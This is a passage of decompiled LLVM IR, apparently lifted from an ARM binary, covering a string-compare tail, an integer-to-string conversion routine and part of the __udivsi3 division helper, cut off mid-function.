  %v0_14ad8 = add i32 %v0_14ad8.in, -1
  %v1_14ae0 = inttoptr i32 %v0_14ad0 to i8*
  %v2_14ae0 = load i8, i8* %v1_14ae0, align 1
  %v3_14ae0 = zext i8 %v2_14ae0 to i32
  store i32 %v3_14ae0, i32* %r2.global-to-local, align 4
  %v1_14ae4 = inttoptr i32 %v0_14ad4 to i8*
  %v2_14ae4 = load i8, i8* %v1_14ae4, align 1
  %v9_14ae8 = icmp eq i8 %v2_14ae0, %v2_14ae4
  br i1 %v9_14ae8, label %dec_label_pc_14ad0, label %dec_label_pc_14af0

dec_label_pc_14af0:                               ; preds = %dec_label_pc_14ae0, %bb28
  ret i32 0

dec_label_pc_14af8:                               ; preds = %dec_label_pc_14ad0, %dec_label_pc_14ad8.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v0_14ad0, { 1, 0 }
  uselistorder i32 %v0_14ad4, { 1, 0 }
  uselistorder i32 %v1_14ac0, { 0, 3, 1, 2 }
  uselistorder i32 %v1_14ab0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14a7c, { 0, 6, 1, 2, 3, 7, 9, 4, 5, 8 }
  uselistorder i8 %v2_14a74, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @function_14b00(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14b00:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-62 = alloca i32, align 4
  %stack_var_-30 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_14b00 = load i32, i32* @r4, align 4
  store i32 %v3_14b00, i32* %stack_var_-28, align 4
  %v22_14b00 = ptrtoint i32* %stack_var_-28 to i32
  %v0_14b04 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_14b04, i32* %r8.global-to-local, align 4
  %v2_14b04 = icmp eq i32 %v0_14b04, 0
  store i1 %v2_14b04, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v2_14b04, label %dec_label_pc_14bf4, label %dec_label_pc_14b14

dec_label_pc_14b14:                               ; preds = %dec_label_pc_14b00
  %v3_14b14 = icmp eq i8 %arg1, 0
  store i1 %v3_14b14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14b14, label %.thread, label %dec_label_pc_14b28

.thread:                                          ; preds = %dec_label_pc_14b14
  %v4_14b1c = inttoptr i32 %v0_14b04 to i8*
  store i8 48, i8* %v4_14b1c, align 1
  %v0_14b20.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14b20.pr.pr, label %.thread1, label %dec_label_pc_14b28

.thread1:                                         ; preds = %.thread
  %v4_14b20 = load i32, i32* %r8.global-to-local, align 4
  %v5_14b20 = add i32 %v4_14b20, 1
  %v6_14b20 = inttoptr i32 %v5_14b20 to i8*
  store i8 0, i8* %v6_14b20, align 1
  %v0_14b24.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14b24.pr.pr, label %dec_label_pc_14bf4, label %dec_label_pc_14b28

dec_label_pc_14b28:                               ; preds = %dec_label_pc_14b14, %.thread, %.thread1
  %tmp40 = icmp slt i8 %arg1, 0
  %v7_14b2c = icmp eq i32 %arg2, 10
  store i1 %v7_14b2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14b2c, label %bb, label %.thread22

.thread22:                                        ; preds = %dec_label_pc_14b28
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_14b28
  %v4_14b28 = zext i1 %tmp40 to i32
  store i32 %v4_14b28, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp40, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  br i1 %phitmp, label %.thread4, label %dec_label_pc_14b50

.thread4:                                         ; preds = %bb, %.thread22
  br label %dec_label_pc_14b60

dec_label_pc_14b50:                               ; preds = %bb
  %v2_14b50 = sub nsw i32 0, %tmp
  store i1 %v3_14b14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14b14, label %dec_label_pc_14c00, label %dec_label_pc_14b60

dec_label_pc_14b60:                               ; preds = %dec_label_pc_14b50, %.thread4
  %v0_14b6810 = phi i32 [ %tmp, %.thread4 ], [ %v2_14b50, %dec_label_pc_14b50 ]
  %storemerge = phi i32 [ 0, %.thread4 ], [ 1, %dec_label_pc_14b50 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r6.global-to-local, align 4
  %v2_14b64 = ptrtoint i32* %stack_var_-30 to i32
  store i32 %v2_14b64, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14b68

dec_label_pc_14b68:                               ; preds = %bb38, %dec_label_pc_14b60
  %v2_14b88 = phi i32 [ %v5_14b88, %bb38 ], [ %v2_14b64, %dec_label_pc_14b60 ]
  %v0_14b84 = phi i32 [ %v2_14b8c, %bb38 ], [ %v0_14b6810, %dec_label_pc_14b60 ]
  %v0_14b6c = load i32, i32* %r5.global-to-local, align 4
  %v2_14b70 = urem i32 %v0_14b84, %v0_14b6c
  store i32 %v2_14b70, i32* %r0.global-to-local, align 4
  %v7_14b74 = icmp eq i32 %v2_14b70, 9
  store i1 %v7_14b74, i1* %cpsr_z.global-to-local, align 1
  %v1_14b78 = add i32 %v2_14b70, 48
  store i32 %v0_14b6c, i32* %r1.global-to-local, align 4
  %v7_14b80 = icmp sgt i32 %v2_14b70, 9
  %extract.t = trunc i32 %v1_14b78 to i8
  br i1 %v7_14b80, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_14b68
  %v9_14b80 = add i32 %v2_14b70, 55
  %extract.t21 = trunc i32 %v9_14b80 to i8
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_14b68, %bb37
  %v0_14b88.off0 = phi i8 [ %extract.t, %dec_label_pc_14b68 ], [ %extract.t21, %bb37 ]
  store i32 %v0_14b84, i32* %r0.global-to-local, align 4
  %v3_14b88 = inttoptr i32 %v2_14b88 to i8*
  store i8 %v0_14b88.off0, i8* %v3_14b88, align 1
  %v4_14b88 = load i32, i32* %r7.global-to-local, align 4
  %v5_14b88 = add i32 %v4_14b88, -1
  store i32 %v5_14b88, i32* %r7.global-to-local, align 4
  %v0_14b8c = load i32, i32* %r0.global-to-local, align 4
  %v1_14b8c = load i32, i32* %r1.global-to-local, align 4
  %v2_14b8c = udiv i32 %v0_14b8c, %v1_14b8c
  store i32 %v2_14b8c, i32* %r0.global-to-local, align 4
  %v2_14b90 = icmp ugt i32 %v1_14b8c, %v0_14b8c
  store i1 %v2_14b90, i1* %cpsr_z.global-to-local, align 1
  %v0_14b94 = load i32, i32* %r6.global-to-local, align 4
  %v1_14b94 = add i32 %v0_14b94, -1
  store i32 %v1_14b94, i32* %r6.global-to-local, align 4
  br i1 %v2_14b90, label %dec_label_pc_14b9c, label %dec_label_pc_14b68

dec_label_pc_14b9c:                               ; preds = %bb38
  %v0_14b9c = load i32, i32* %sl.global-to-local, align 4
  %v2_14b9c = icmp eq i32 %v0_14b9c, 0
  store i1 %v2_14b9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b9c, label %bb39, label %dec_label_pc_14c04

bb39:                                             ; preds = %dec_label_pc_14b9c
  store i32 %v0_14b94, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14ba8

dec_label_pc_14ba8:                               ; preds = %bb39, %dec_label_pc_14c04
  %v1_14bb4 = phi i32 [ %v0_14b94, %bb39 ], [ %v1_14bac.pre, %dec_label_pc_14c04 ]
  %v2_14ba8 = ptrtoint i32* %stack_var_-62 to i32
  %v2_14bac = add i32 %v1_14bb4, %v2_14ba8
  %v3_14bac = inttoptr i32 %v2_14bac to i8*
  %v4_14bac = load i8, i8* %v3_14bac, align 1
  %v6_14bac = zext i8 %v4_14bac to i32
  store i32 %v6_14bac, i32* %r2.global-to-local, align 4
  %v2_14bb0 = icmp eq i8 %v4_14bac, 0
  store i1 %v2_14bb0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_14bac, i32* %r1.global-to-local, align 4
  br i1 %v2_14bb0, label %dec_label_pc_14bd8, label %dec_label_pc_14bbc

dec_label_pc_14bbc:                               ; preds = %dec_label_pc_14ba8
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14bc0

dec_label_pc_14bc0:                               ; preds = %dec_label_pc_14bc0, %dec_label_pc_14bbc
  %v0_14bc0 = phi i32 [ %v1_14bc0, %dec_label_pc_14bc0 ], [ 0, %dec_label_pc_14bbc ]
  %v1_14bc0 = add i32 %v0_14bc0, 1
  store i32 %v1_14bc0, i32* %r2.global-to-local, align 4
  %v2_14bc4 = add i32 %v1_14bc0, %v2_14bac
  %v3_14bc4 = inttoptr i32 %v2_14bc4 to i8*
  %v4_14bc4 = load i8, i8* %v3_14bc4, align 1
  %v2_14bc8 = icmp eq i8 %v4_14bc4, 0
  store i1 %v2_14bc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14bc8, label %dec_label_pc_14bd0, label %dec_label_pc_14bc0

dec_label_pc_14bd0:                               ; preds = %dec_label_pc_14bc0
  %v7_14bd0 = icmp eq i32 %v0_14bc0, -2
  store i1 %v7_14bd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14bd0, label %dec_label_pc_14bf4, label %dec_label_pc_14bd8

dec_label_pc_14bd8:                               ; preds = %dec_label_pc_14bd0, %dec_label_pc_14ba8
  %v0_14be018 = phi i32 [ %v1_14bc0, %dec_label_pc_14bd0 ], [ %v6_14bac, %dec_label_pc_14ba8 ]
  store i32 %v2_14bac, i32* %r0.global-to-local, align 4
  %v0_14bdc = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14bdc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14be0

dec_label_pc_14be0:                               ; preds = %dec_label_pc_14be0.dec_label_pc_14be0_crit_edge, %dec_label_pc_14bd8
  %v2_14bec = phi i32 [ %v5_14bec, %dec_label_pc_14be0.dec_label_pc_14be0_crit_edge ], [ %v0_14bdc, %dec_label_pc_14bd8 ]
  %v0_14be4 = phi i32 [ %v0_14be4.pre, %dec_label_pc_14be0.dec_label_pc_14be0_crit_edge ], [ %v2_14bac, %dec_label_pc_14bd8 ]
  %v0_14be0 = phi i32 [ %v0_14be0.pre, %dec_label_pc_14be0.dec_label_pc_14be0_crit_edge ], [ %v0_14be018, %dec_label_pc_14bd8 ]
  %v1_14be0 = add i32 %v0_14be0, -1
  store i32 %v1_14be0, i32* %r2.global-to-local, align 4
  %v1_14be4 = inttoptr i32 %v0_14be4 to i8*
  %v2_14be4 = load i8, i8* %v1_14be4, align 1
  %v5_14be4 = add i32 %v0_14be4, 1
  store i32 %v5_14be4, i32* %r0.global-to-local, align 4
  %v3_14be8 = icmp eq i32 %v0_14be0, 0
  store i1 %v3_14be8, i1* %cpsr_z.global-to-local, align 1
  %v3_14bec = inttoptr i32 %v2_14bec to i8*
  store i8 %v2_14be4, i8* %v3_14bec, align 1
  %v4_14bec = load i32, i32* %r1.global-to-local, align 4
  %v5_14bec = add i32 %v4_14bec, 1
  store i32 %v5_14bec, i32* %r1.global-to-local, align 4
  br i1 %v3_14be8, label %dec_label_pc_14bf4, label %dec_label_pc_14be0.dec_label_pc_14be0_crit_edge

dec_label_pc_14be0.dec_label_pc_14be0_crit_edge:  ; preds = %dec_label_pc_14be0
  %v0_14be0.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_14be4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14be0

dec_label_pc_14bf4:                               ; preds = %dec_label_pc_14be0, %dec_label_pc_14bd0, %.thread1, %dec_label_pc_14b00
  %v0_14bf4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14bf4, i32* %r0.global-to-local, align 4
  %v2_14bfc = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_14bfc, i32* @r4, align 4
  ret i32 %v0_14bf4

dec_label_pc_14c00:                               ; preds = %dec_label_pc_14b50
  store i32 32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14c04

dec_label_pc_14c04:                               ; preds = %dec_label_pc_14b9c, %dec_label_pc_14c00
  %v1_14c08 = phi i32 [ %v1_14b94, %dec_label_pc_14b9c ], [ 32, %dec_label_pc_14c00 ]
  %v2_14c08 = add i32 %v1_14c08, %v22_14b00
  store i32 %v2_14c08, i32* %r2.global-to-local, align 4
  %v3_14c10 = add i32 %v2_14c08, -34
  %v4_14c10 = inttoptr i32 %v3_14c10 to i8*
  store i8 45, i8* %v4_14c10, align 1
  %v1_14bac.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14ba8

; uselistorder directives
  uselistorder i32 %v5_14bec, { 1, 0 }
  uselistorder i1 %v3_14be8, { 1, 0 }
  uselistorder i32 %v0_14be4, { 1, 0 }
  uselistorder i1 %v7_14bd0, { 1, 0 }
  uselistorder i32 %v1_14bc0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_14bac, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_14b8c, { 1, 0 }
  uselistorder i32 %v5_14b88, { 1, 0 }
  uselistorder i32 %v2_14b70, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 1, 0 }
  uselistorder i1 %v3_14b14, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14b04, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 1, 7, 8, 2, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 12, 11, 13, 14 }
  uselistorder i8 45, { 1, 0 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder i32 48, { 4, 2, 1, 0, 3 }
  uselistorder i32 9, { 5, 67, 6, 7, 61, 36, 11, 40, 12, 39, 10, 3, 62, 37, 63, 2, 38, 13, 65, 66, 14, 41, 42, 15, 16, 17, 43, 18, 44, 19, 45, 0, 20, 21, 22, 23, 1, 24, 26, 25, 64, 46, 47, 8, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 4, 60, 27, 28, 29, 30, 31, 32, 33, 34, 35, 68, 69, 9, 70 }
  uselistorder i32 32, { 48, 61, 62, 57, 50, 49, 5, 4, 7, 6, 9, 8, 11, 10, 56, 13, 12, 14, 15, 16, 18, 17, 19, 21, 20, 23, 22, 24, 25, 27, 26, 51, 58, 59, 28, 60, 29, 30, 31, 0, 32, 1, 2, 3, 33, 34, 35, 36, 37, 39, 38, 52, 63, 53, 64, 54, 65, 41, 40, 43, 42, 44, 45, 46, 47, 55 }
  uselistorder i32 10, { 73, 0, 1, 10, 34, 6, 29, 36, 11, 35, 4, 66, 67, 30, 12, 68, 31, 69, 13, 71, 70, 37, 14, 15, 16, 17, 18, 19, 20, 38, 21, 39, 7, 40, 41, 2, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 22, 52, 53, 54, 23, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 5, 65, 8, 74, 72, 75, 3, 27, 32, 76, 25, 77, 28, 33, 9, 78, 24, 79, 26 }
  uselistorder i8 0, { 28, 29, 0, 10, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 6, 41, 42, 43, 44, 45, 46, 1, 12, 11, 13, 49, 51, 48, 22, 50, 23, 52, 53, 47, 2, 54, 55, 56, 4, 5, 3, 57, 58, 59, 15, 14, 60, 61, 64, 25, 62, 63, 24, 65, 66, 67, 68, 69, 16, 7, 17, 70, 18, 19, 27, 71, 72, 73, 75, 76, 9, 79, 21, 85, 80, 81, 77, 78, 20, 26, 82, 83, 84, 8, 86, 87, 74, 88, 89, 90, 91, 92, 93, 94 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14c04, { 1, 0 }
  uselistorder label %dec_label_pc_14ba8, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_14b28, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_14c18 = add i32 %arg2, -1
  %v7_14c18 = icmp eq i32 %arg2, 1
  br i1 %v7_14c18, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_14c1c = load i32, i32* @r0, align 4
  ret i32 %v2_14c1c

bb80:                                             ; preds = %entry
  %v2_14c18 = icmp eq i32 %arg2, 0
  br i1 %v2_14c18, label %dec_label_pc_14d00, label %dec_label_pc_14c24

dec_label_pc_14c24:                               ; preds = %bb80
  %v0_14c24 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_14c24, %arg2
  br i1 %tmp, label %dec_label_pc_14c2c, label %dec_label_pc_14cb8

dec_label_pc_14c2c:                               ; preds = %dec_label_pc_14c24
  %v2_14c2c = and i32 %v1_14c18, %arg2
  %v4_14c2c = icmp eq i32 %v2_14c2c, 0
  br i1 %v4_14c2c, label %dec_label_pc_14cc4, label %dec_label_pc_14c34

dec_label_pc_14c34:                               ; preds = %dec_label_pc_14c2c
  %v3_14c34 = icmp ult i32 %arg2, 536870912
  br i1 %v3_14c34, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_14c34
  %v4_14c38 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_14c34, %.thread
  %v0_14c58.pr36.ph = phi i32 [ %v4_14c38, %.thread ], [ %arg2, %dec_label_pc_14c34 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_14c34 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_14c58.pr36 = phi i32 [ %v4_14c4c, %bb83 ], [ %v0_14c58.pr36.ph, %.preheader.preheader ]
  %v1_14c50 = phi i32 [ %v4_14c50, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_14c44 = icmp ugt i32 %v0_14c58.pr36, 268435455
  br i1 %v2_14c44, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_14c58thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_14c48 = icmp ult i32 %v0_14c58.pr36, %v0_14c24
  br i1 %v4_14c48, label %bb82, label %dec_label_pc_14c58thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_14c4c = and i32 %v0_14c58.pr36, 268435456
  %v3_14c4c = icmp eq i32 %v2_14c4c, 0
  %v4_14c4c = mul i32 %v0_14c58.pr36, 16
  br i1 %v3_14c4c, label %bb83, label %dec_label_pc_14c58.loopexit

bb83:                                             ; preds = %bb82
  %v2_14c50 = and i32 %v1_14c50, 268435456
  %v3_14c50 = icmp eq i32 %v2_14c50, 0
  %v4_14c50 = mul i32 %v1_14c50, 16
  br i1 %v3_14c50, label %.preheader, label %dec_label_pc_14c58thread-pre-split.loopexit.loopexit

dec_label_pc_14c58thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_14c6448.ph = phi i32 [ %v1_14c50, %bb81 ], [ %v4_14c50, %bb83 ]
  %v0_14c58.pr38.ph = phi i32 [ %v0_14c58.pr36, %bb81 ], [ %v4_14c4c, %bb83 ]
  br label %dec_label_pc_14c58thread-pre-split.loopexit

dec_label_pc_14c58thread-pre-split.loopexit:      ; preds = %dec_label_pc_14c58thread-pre-split.loopexit.loopexit, %.thread2
  %v1_14c6448 = phi i32 [ %v1_14c50, %.thread2 ], [ %v1_14c6448.ph, %dec_label_pc_14c58thread-pre-split.loopexit.loopexit ]
  %v0_14c58.pr38 = phi i32 [ %v0_14c58.pr36, %.thread2 ], [ %v0_14c58.pr38.ph, %dec_label_pc_14c58thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_14c58thread-pre-split

dec_label_pc_14c58thread-pre-split:               ; preds = %dec_label_pc_14c58thread-pre-split.loopexit, %bb85
  %v1_14c6446 = phi i32 [ %v1_14c6448, %dec_label_pc_14c58thread-pre-split.loopexit ], [ %v3_14c64, %bb85 ]
  %v0_14c58.pr = phi i32 [ %v0_14c58.pr38, %dec_label_pc_14c58thread-pre-split.loopexit ], [ %v3_14c60, %bb85 ]
  br label %dec_label_pc_14c58

dec_label_pc_14c58.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_14c58

dec_label_pc_14c58:                               ; preds = %dec_label_pc_14c58.loopexit, %dec_label_pc_14c58thread-pre-split
  %v1_14c64 = phi i32 [ %v1_14c6446, %dec_label_pc_14c58thread-pre-split ], [ %v1_14c50, %dec_label_pc_14c58.loopexit ]
  %v1_14c60 = phi i32 [ %v0_14c58.pr, %dec_label_pc_14c58thread-pre-split ], [ %v4_14c4c, %dec_label_pc_14c58.loopexit ]
  %v2_14c58 = icmp slt i32 %v1_14c60, 0
  br i1 %v2_14c58, label %dec_label_pc_14c6c, label %bb84

bb84:                                             ; preds = %dec_label_pc_14c58
  %v4_14c5c = icmp ult i32 %v1_14c60, %v0_14c24
  br i1 %v4_14c5c, label %bb85, label %dec_label_pc_14c6c

bb85:                                             ; preds = %bb84
  %v3_14c60 = mul i32 %v1_14c60, 2
  %v2_14c64 = icmp slt i32 %v1_14c64, 0
  %v3_14c64 = mul i32 %v1_14c64, 2
  br i1 %v2_14c64, label %dec_label_pc_14c6c, label %dec_label_pc_14c58thread-pre-split

dec_label_pc_14c6c:                               ; preds = %bb84, %dec_label_pc_14c58, %bb85
  %v2_14c7859 = phi i32 [ %v3_14c64, %bb85 ], [ %v1_14c64, %bb84 ], [ %v1_14c64, %dec_label_pc_14c58 ]
  %v1_14c7051 = phi i32 [ %v3_14c60, %bb85 ], [ %v1_14c60, %bb84 ], [ %v1_14c60, %dec_label_pc_14c58 ]
  br label %dec_label_pc_14c70

dec_label_pc_14c70:                               ; preds = %.thread11, %dec_label_pc_14c6c
  %v1_14ca4 = phi i32 [ %v4_14ca4, %.thread11 ], [ %v2_14c7859, %dec_label_pc_14c6c ]
  %v1_14c78 = phi i32 [ %v0_14cb0, %.thread11 ], [ 0, %dec_label_pc_14c6c ]
  %v1_14ca8 = phi i32 [ %v4_14ca8, %.thread11 ], [ %v1_14c7051, %dec_label_pc_14c6c ]
  %v1_14c74 = phi i32 [ %v0_14ca0, %.thread11 ], [ %v0_14c24, %dec_label_pc_14c6c ]
  %v3_14c70 = icmp ult i32 %v1_14c74, %v1_14ca8
  br i1 %v3_14c70, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_14c70
  %v3_14c74 = sub i32 %v1_14c74, %v1_14ca8
  %v3_14c78 = or i32 %v1_14c78, %v1_14ca4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_14c70, %bb86
  %v1_14c80 = phi i32 [ %v1_14c74, %dec_label_pc_14c70 ], [ %v3_14c74, %bb86 ]
  %v1_14c84 = phi i32 [ %v1_14c78, %dec_label_pc_14c70 ], [ %v3_14c78, %bb86 ]
  %v4_14c7c = udiv i32 %v1_14ca8, 2
  %v6_14c7c = icmp ult i32 %v1_14c80, %v4_14c7c
  br i1 %v6_14c7c, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_14c80 = urem i32 %v1_14ca8, 2
  %v4_14c80 = icmp eq i32 %v3_14c80, 0
  %v6_14c80 = sub i32 %v1_14c80, %v4_14c7c
  br i1 %v4_14c80, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_14c84 = udiv i32 %v1_14ca4, 2
  %v6_14c84 = or i32 %v1_14c84, %v5_14c84
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_14c8c = phi i32 [ %v6_14c80, %bb87 ], [ %v1_14c80, %.thread7 ], [ %v6_14c80, %bb88 ]
  %v1_14c90 = phi i32 [ %v1_14c84, %bb87 ], [ %v1_14c84, %.thread7 ], [ %v6_14c84, %bb88 ]
  %v4_14c88 = udiv i32 %v1_14ca8, 4
  %v6_14c88 = icmp ult i32 %v1_14c8c, %v4_14c88
  br i1 %v6_14c88, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_14c8c = and i32 %v1_14ca8, 2
  %v4_14c8c = icmp eq i32 %v3_14c8c, 0
  %v6_14c8c = sub i32 %v1_14c8c, %v4_14c88
  br i1 %v4_14c8c, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_14c90 = udiv i32 %v1_14ca4, 4
  %v6_14c90 = or i32 %v1_14c90, %v5_14c90
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_14c98 = phi i32 [ %v6_14c8c, %bb89 ], [ %v1_14c8c, %.thread8 ], [ %v6_14c8c, %bb90 ]
  %v1_14c9c = phi i32 [ %v1_14c90, %bb89 ], [ %v1_14c90, %.thread8 ], [ %v6_14c90, %bb90 ]
  %v4_14c94 = udiv i32 %v1_14ca8, 8
  %v6_14c94 = icmp ult i32 %v1_14c98, %v4_14c94
  br i1 %v6_14c94, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_14c98 = and i32 %v1_14ca8, 4
  %v4_14c98 = icmp eq i32 %v3_14c98, 0
  %v6_14c98 = sub i32 %v1_14c98, %v4_14c94
  br i1 %v4_14c98, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_14c9c = udiv i32 %v1_14ca4, 8
  %v6_14c9c = or i32 %v1_14c9c, %v5_14c9c
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_14cb0 = phi i32 [ %v1_14c9c, %bb91 ], [ %v1_14c9c, %.thread9 ], [ %v6_14c9c, %bb92 ]
  %v0_14ca0 = phi i32 [ %v6_14c98, %bb91 ], [ %v1_14c98, %.thread9 ], [ %v6_14c98, %bb92 ]
  %v2_14ca0 = icmp eq i32 %v0_14ca0, 0
  br i1 %v2_14ca0, label %dec_label_pc_14cb0, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_14ca4, 16
  br i1 %tmp140, label %dec_label_pc_14cb0, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_14ca4 = udiv i32 %v1_14ca4, 16
  %v4_14ca8 = udiv i32 %v1_14ca8, 16
  br label %dec_label_pc_14c70

dec_label_pc_14cb0:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_14cb0

dec_label_pc_14cb8:                               ; preds = %dec_label_pc_14c24
  %v9_14c24 = icmp eq i32 %v0_14c24, %arg2
  %. = zext i1 %v9_14c24 to i32
  ret i32 %.

dec_label_pc_14cc4:                               ; preds = %dec_label_pc_14c2c
  %v2_14cc4 = icmp ugt i32 %arg2, 65535
  br i1 %v2_14cc4, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_14cc4
  %v2_14cc8 = and i32 %arg2, 32768
  %v3_14cc8 = icmp eq i32 %v2_14cc8, 0
  %v4_14cc8 = udiv i32 %arg2, 65536
  br i1 %v3_14cc8, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_14cc4
  %v0_14cd465 = phi i32 [ %arg2, %dec_label_pc_14cc4 ], [ %v4_14cc8, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_14cd8 = phi i32 [ %v0_14cd465, %.thread16 ], [ %v4_14cc8, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_14cd4 = icmp ugt i32 %v1_14cd8, 255
  br i1 %v2_14cd4, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_14cd8 = and i32 %v1_14cd8, 128
  %v3_14cd8 = icmp eq i32 %v2_14cd8, 0
  %v4_14cd8 = udiv i32 %v1_14cd8, 256
  br i1 %v3_14cd8, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_14cdc = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_14ce8 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_14cdc, %bb100 ]
  %v1_14ce4 = phi i32 [ %v1_14cd8, %bb98 ], [ %v4_14cd8, %bb99 ], [ %v4_14cd8, %bb100 ]
  %v2_14ce0 = icmp ugt i32 %v1_14ce4, 15
  br i1 %v2_14ce0, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_14ce4 = and i32 %v1_14ce4, 8
  %v3_14ce4 = icmp eq i32 %v2_14ce4, 0
  %v4_14ce4 = udiv i32 %v1_14ce4, 16
  br i1 %v3_14ce4, label %.thread18, label %bb102

